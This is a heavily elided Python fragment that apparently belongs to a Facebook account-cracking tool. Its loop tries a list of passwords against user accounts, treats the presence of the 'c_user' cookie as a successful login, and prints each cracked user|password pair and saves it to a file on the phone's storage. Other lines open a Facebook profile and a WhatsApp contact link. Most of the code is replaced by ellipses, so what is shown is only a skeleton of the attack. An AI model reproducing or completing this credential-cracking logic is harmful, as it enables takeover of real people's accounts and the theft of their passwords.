...
def R():
			...
			if key in [""]:
				...
				os.system("xdg-open= https://www.facebook.com/ITS.TUNAN69k")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [TUNAN-OK 💥] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/TUNAN_OK.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/01887074682")
	time.sleep(3)
	R()
def yt():
	logo()
